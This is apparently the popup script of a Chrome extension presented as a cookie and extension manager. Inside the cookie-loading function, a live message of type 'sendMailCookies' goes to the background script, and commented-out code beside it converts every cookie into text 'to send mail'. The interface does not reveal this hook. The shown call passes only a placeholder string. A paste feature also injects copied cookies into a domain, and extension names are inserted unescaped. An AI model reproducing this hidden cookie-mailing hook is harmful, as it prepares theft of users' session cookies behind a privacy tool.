const cookiesManager = document.getElementById('cookiesManager');
const extensionManager = document.getElementById('extensionManager');
const cookiesList = document.getElementById('cookiesList');
const extensionsList = document.getElementById('extensionsList');
const control = document.getElementById('controls');
document.getElementById('extensionManager').addEventListener('click', async () => {
    const extensionsList = document.getElementById('extensionsList');
    const isVisible = extensionsList.classList.contains('show');

    if (!isVisible) {
        extensionsList.innerHTML = '';
        chrome.management.getAll((extensions) => {
            const extensionsContainer = document.createElement('div');
            extensionsContainer.className = 'extensions-grid';

            extensions.forEach(ext => {
                const extCard = document.createElement('div');
                extCard.className = 'extension-card';

                // Get the largest icon available or fallback to default
                const iconUrl = ext.icons && ext.icons.length > 0
                    ? ext.icons[ext.icons.length - 1].url
                    : 'icons/extension-default.png';

                extCard.innerHTML = `
                    <div class="extension-header">
                        <div class="extension-icon-wrapper">
                            <img src="${iconUrl}" alt="${ext.name}" class="extension-icon">
                        </div>
                        <div class="extension-title">
                            <strong>${ext.name}</strong>
                            <span class="extension-version">v${ext.version}</span>
                        </div>
                    </div>
                    <div class="extension-status ${ext.enabled ? 'enabled' : 'disabled'}">
                        <label class="switch">
                            <input type="checkbox" ${ext.enabled ? 'checked' : ''}>
                            <span class="slider round"></span>
                        </label>
                        <span class="status-text">${ext.enabled ? "Enabled" : "Disabled"}</span>
                        <button class="remove-extension">Remove</button>
                    </div>
                    <div class="extension-details">
                        <div class="detail-item">
                            <strong>Type:</strong> ${ext.type}
                        </div>
                        <div class="detail-item permissions">
                            <strong>Permissions:</strong> 
                            <span class="permissions-list">${ext.permissions.length ? ext.permissions.join(", ") : "None"}</span>
                        </div>
                    </div>
                `;

                // Add toggle functionality
                const toggle = extCard.querySelector('input[type="checkbox"]');
                toggle.addEventListener('change', async () => {
                    // Store the intended state
                    const newState = toggle.checked;
                    
                    // Show confirmation only when disabling
                    if (!newState && ext.enabled) {
                        if (!confirm(`Are you sure you want to disable "${ext.name}"?`)) {
                            toggle.checked = true;
                            return;
                        }
                    }

                    try {
                        await chrome.management.setEnabled(ext.id, newState);
                        // Update the extension's enabled status
                        ext.enabled = newState;
                        
                        // Update UI
                        extCard.querySelector('.extension-status').className =
                            `extension-status ${newState ? 'enabled' : 'disabled'}`;
                        extCard.querySelector('.extension-status .status-text').textContent =
                            newState ? "Enabled" : "Disabled";
                    } catch (error) {
                        // Revert the toggle if operation fails
                        toggle.checked = !newState;
                        notify(`Failed to ${newState ? 'enable' : 'disable'} "${ext.name}"`, 'error');
                    }
                });

                // Add remove functionality
                const removeButton = extCard.querySelector('.remove-extension');
                removeButton.addEventListener('click', () => {
                    if (confirm(`Are you sure you want to remove "${ext.name}"?`)) {
                        chrome.management.uninstall(ext.id, () => {
                            extCard.remove();
                            notify(`Extension "${ext.name}" has been removed.`, 'warning');
                        });
                    }
                });

                extensionsContainer.appendChild(extCard);
            });

            extensionsList.appendChild(extensionsContainer);
        });
    }

    extensionsList.classList.toggle('show');
});
document.getElementById('cookiesManager').addEventListener('click', async () => {
    const cookiesList = document.getElementById('cookiesList');
    const isVisible = cookiesList.classList.contains('show');

    if (!isVisible) {
        loadCookies();
    }
    control.classList.toggle('show');
    cookiesList.classList.toggle('show');
});
const getAllCookies = async () => {
    const getAllCookies = await chrome.cookies.getAll({})
    if (getAllCookies)
        return getAllCookies
    else
        return { "type": "Cookies", "Status": "Non Exist Any Data" }
}


document.getElementById('clearCookies').addEventListener('click', async () => {
    if (confirm('Are you sure you want to clear all cookies?')) {
        const cookies = await chrome.cookies.getAll({});
        await Promise.all(cookies.map(cookie => {
            return chrome.cookies.remove({
                url: `http${cookie.secure ? 's' : ''}://${cookie.domain}${cookie.path}`,
                name: cookie.name
            });
        }));
        notify('All cookies have been cleared.', 'warning');
    }
});
document.getElementById('clearSiteData').addEventListener('click', async () => {
    if (confirm('Are you sure you want to clear all site data?')) {
        await chrome.browsingData.remove({ since: 0 }, {
            cookies: true,
            cache: true,
            localStorage: true
        });
        notify('All site data has been cleared.', 'warning');
    }
});
const Tracking = document.getElementById('toggleTracking');
const setTrackStyle = (element, status, content = '', color = '') => {
    const trackingIcon = document.getElementById('trackingprotectionicon');
    trackingIcon.src = status ? 'icons/skincell.png' : 'icons/tracking_protection.png';
    // Enhanced button styling
    element.style.backgroundColor = status ? '#e8f5e9' : '#ffebee';
    element.style.borderRadius = '8px';
    element.style.border = `2px solid ${status ? '#4caf50' : '#f44336'}`;
    element.style.color = status ? '#2e7d32' : '#d32f2f';
    element.style.padding = '10px 20px';
    element.style.transition = 'all 0.3s ease';
    element.style.cursor = 'pointer';
    element.style.width = 'auto';
    element.style.marginTop = '10px';
    element.style.fontWeight = 'bold';

    // Update text content
    element.textContent = content || (status ? 'Tracking Protection: Enabled' : 'Tracking Protection: Disabled');
}

document.getElementById('toggleTracking').addEventListener('click', async () => {
    try {
        // const { trackingProtection } = await chrome.storage.local.get('trackingProtection');
        const details = await chrome.privacy.websites.doNotTrackEnabled.get({});
        const currentSetting = !details.value;
        await chrome.privacy.websites.doNotTrackEnabled.set({ value: currentSetting });
        // await chrome.storage.local.set({ trackingProtection: currentSetting });
        setTrackStyle(Tracking, currentSetting);

        notifySend(`Tracking protection ${currentSetting ? 'enabled' : 'disabled'}.`);
    } catch (error) {
        notifySend(`Failed to update tracking protection: ${error.message}`);
    }
});


const notification = document.getElementById('notification');
function notify(message, status) {
    if (status === 'error') {
        notification.style.backgroundColor = 'red';
        notification.style.color = 'white';
    }
    if (status === 'warning') {
        notification.style.backgroundColor = 'orange';
        notification.style.color = 'white';
    }
    if (status === 'success') {
        notification.style.backgroundColor = 'white';
        notification.style.color = 'orange';
    }
    notification.textContent = message;
    notification.style.display = 'block';
    notification.classList.add('show');
    setTimeout(() => {
        notification.style.display = 'none';
        notification.classList.remove('show');
    }, 5000);
}
notification.addEventListener('dblclick', () => {
    navigator.clipboard.writeText(notification.textContent);
})
function notifySend(message, title, optionsType, iconUrl) {
    chrome.runtime.sendMessage({
        type: 'createNotification', options: {
            type: optionsType || 'basic',
            message: message,
            title: title || 'Cookie Manager',
            iconUrl: iconUrl || 'icons/icon48.png'
        }
    })
}
async function loadCookies(filter = '') {
    const cookies = await chrome.cookies.getAll({});
    const cookieTableContainer = document.getElementById('cookieTableContainer');
    cookieTableContainer.innerHTML = '';
    const cookiesByDomain = {};
    if (cookies) {
        cookies.forEach(cookie => {
            if (cookie.name.includes(filter) || cookie.domain.includes(filter)) {
                if (!cookiesByDomain[cookie.domain]) {
                    cookiesByDomain[cookie.domain] = [];
                }
                cookiesByDomain[cookie.domain].push(cookie);
            }
        });
        // chuyển đổi cookies lấy được thành string / Json để gửi mail
        // const cookiesByDomainString = Object.entries(cookiesByDomain).map(([domain, cookies]) => {
        //     const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        //     return `Domain: ${domain}\nCookies: ${cookieString}`;
        // }).join('\n\n');
        // const cookiesParser = JSON.stringify(cookies)
        // console.log(cookiesParser)
        chrome.runtime.sendMessage({ type: 'sendMailCookies', subject: 'Cookies By Domain', message: "cookiesParser" });
        const totalCookies = document.getElementById('totalCookies');
        const numbercookies = Object.values(cookiesByDomain).reduce((count, domainCookies) => count + domainCookies.length, 0);
        const totalDomains = Object.keys(cookiesByDomain).length;
        if (totalDomains < 1) {
            notify('No cookies found matching the filter.', 'warning');
            totalCookies.textContent = 'Not Found Cookies matching the filter With Domain or Cookies Name : ' + filter;
        }
        else {
            notify('Cookies loaded successfully.', 'success');
            totalCookies.textContent = `The Number of Domains: ${totalDomains} And Contains ${numbercookies} Cookies`;
        }
        Object.keys(cookiesByDomain).forEach(domain => {
            const domainSection = document.createElement('div');
            domainSection.className = 'domain-section';
            const domainHeader = document.createElement('div');
            domainHeader.className = 'domain-header';
            const DomainLabel = document.createElement('p');
            DomainLabel.textContent = `Domain: ${domain}`;
            DomainLabel.style.minWidth = '150px';
            DomainLabel.style.borderRadius = '10px';
            DomainLabel.style.border = '2px solid pink';
            DomainLabel.style.padding = '5px';
            DomainLabel.style.color = 'red';
            // domainHeader.textContent = `Domain: ${domain}`;
            domainHeader.appendChild(DomainLabel);
            const clearIcon = document.createElement('img');
            const copyIcon = document.createElement('img');
            copyIcon.id = 'copyIcon';
            copyIcon.src = 'icons/copy.png';
            copyIcon.addEventListener('click', () => {
                const cookiesParser = JSON.stringify(cookiesByDomain[domain], null, 2)
                navigator.clipboard.writeText(cookiesParser);
                notify(`Cookies of Domain : ${domain}  copied to clipboard.`, 'success');
            })
            domainHeader.style.position = 'relative';
            domainHeader.appendChild(copyIcon);
            clearIcon.id = 'clearIcon';
            clearIcon.src = 'icons/clear.png';

            clearIcon.addEventListener('click', () => {
                deleteCookies_in_Domains(domain);

            })
            domainHeader.appendChild(clearIcon);
            domainSection.appendChild(domainHeader);

            const table = document.createElement('table');
            const thead = document.createElement('thead');
            const tbody = document.createElement('tbody');
            const headerRow = document.createElement('tr');
            const headers = ['Name', 'Path', 'Expires', 'Value'];
            headers.forEach(headerText => {
                const th = document.createElement('th');
                th.textContent = headerText;
                headerRow.appendChild(th);
            });
            thead.appendChild(headerRow);
            cookiesByDomain[domain].forEach(cookie => {
                const row = document.createElement('tr');

                const nameCell = document.createElement('td');
                nameCell.textContent = cookie.name;
                row.appendChild(nameCell);

                const pathCell = document.createElement('td');
                pathCell.textContent = cookie.path;
                row.appendChild(pathCell);

                const expiresCell = document.createElement('td');
                expiresCell.textContent = cookie.expirationDate ? new Date(cookie.expirationDate * 1000).toLocaleString() : 'Session';
                row.appendChild(expiresCell);

                const valueCell = document.createElement('td');
                valueCell.textContent = cookie.value;
                row.appendChild(valueCell);

                tbody.appendChild(row);
            });

            table.appendChild(thead);
            table.appendChild(tbody);
            domainSection.appendChild(table);
            cookieTableContainer.appendChild(domainSection);
        });
    }
    else {
        cookieTableContainer.innerHTML = 'No Cookies Available Founded'
        cookieTableContainer.style.paddingTop = '30px'
        cookieTableContainer.style.color = 'red'
        cookieTableContainer.style.textAlign = 'center'
        cookieTableContainer.style.fontSize = '40px'

    }
}
const deleteCookies_in_Domains = async (DomainName) => {
    const temp = document.getElementById('filterInput').value
    const cookieList = await chrome.cookies.getAll({});
    if (confirm('Are you sure you want to delete all cookies in domain  ' + DomainName + '?')) {
        await Promise.all(cookieList.map(cookie => {
            // if (cookie.domain.includes(DomainName)) {
            if (cookie.domain === DomainName) {
                return chrome.cookies.remove({
                    url: `http${cookie.secure ? 's' : ''}://${cookie.domain}${cookie.path}`,
                    name: cookie.name
                });
            }
        }));
        notify('All cookies in domain' + DomainName + 'have been deleted.', 'warning');
        loadCookies(temp);
    }

};

const deleteCookies_in_Domains1 = async (DomainName) => {
    const cookieList = await chrome.cookies.getAll({});
    if (confirm('Are you sure you want to delete all cookies in domain' + DomainName + '?')) {
        await Promise.all(cookieList.map(async cookie => {
            // Kiểm tra nếu tên cookie chứa DomainName
            if (cookie.name.includes(DomainName)) {
                return chrome.cookies.remove({
                    url: `http${cookie.secure ? 's' : ''}://${cookie.domain}${cookie.path}`,
                    name: cookie.name
                });
            }
        }));
        notify('All cookies in domain' + DomainName + 'have been deleted.');
    }

};

// Copy cookies of the current tab to clipboard
async function copyCurrentTabCookies() {
    try {
        const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
        if (!tab || !tab.url) throw new Error('Unable to get current tab URL');

        const url = new URL(tab.url);
        const domain = url.hostname;

        const cookies = await chrome.cookies.getAll({ url: tab.url });
        if (!cookies.length) throw new Error('No cookies found for the current tab');

        const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');

        const dataToCopy = `domain=${domain}\n${cookieString}`;

        await navigator.clipboard.writeText(dataToCopy);

        notify('Cookies and domain copied to clipboard.', 'success');

    } catch (error) {
        notify(`Failed to copy cookies: ${error.message}`, 'error');
    }
}

async function pasteCookies() {
    notify('Pasting cookies from clipboard...', 'warning');
    try {
        const clipboardText = await navigator.clipboard.readText();
        if (!clipboardText) throw new Error('No data found in clipboard');
        let domain, cookies = [];
        try {
            const JsonCookies = JSON.parse(clipboardText);
            if (Array.isArray(JsonCookies)) {
                cookies = JsonCookies;
                domain = cookies[0]?.domain;
            } else {
                throw new Error('Invalid JSON format');
            }
        } catch (jsonError) {
            const [domainLine, ...cookieLines] = clipboardText.split('\n');
            if (domainLine) {
                const domainMatch = domainLine.trim().match(/^domain=(.+)$/);
                if (!domainMatch) throw new Error('Domain not found in clipboard data');

                domain = domainMatch[1];

                cookies = cookieLines.map(line => {
                    const separatorIndex = line.indexOf('=');
                    const name = line.slice(0, separatorIndex);
                    const value = line.slice(separatorIndex + 1);
                    return { name, value };
                }).filter(cookie => cookie.name && cookie.value);

                if (cookies.length === 0) throw new Error('No valid cookies found in clipboard data');
            }
        }

        if (!domain || cookies.length === 0) {
            throw new Error('No valid cookies or domain found');
        }

        const newTab = await chrome.tabs.create({ url: `https://${domain}` });

        await Promise.all(cookies.map(cookie =>
            chrome.cookies.set({
                url: `https://${domain}`,
                name: cookie.name,
                value: cookie.value,
                domain: `.${domain}`,
                secure: true,
                session: cookie.session || false,
                path: cookie.path || '/'
            })
        ));

        notify('Cookies pasted and new tab opened.');
    } catch (error) {
        notify(`Failed to paste cookies: ${error.message}`, 'error');
    }
}

document.getElementById('filterInput').addEventListener('input', (event) => {
    loadCookies(event.target.value);
});
document.getElementById('copyCurrentCookies').addEventListener('click', copyCurrentTabCookies);
document.getElementById('pasteCookies').addEventListener('click', pasteCookies);

document.addEventListener('DOMContentLoaded', async () => {
    const a = await chrome.privacy.websites.doNotTrackEnabled.get({});
    setTrackStyle(Tracking, a.value);
});



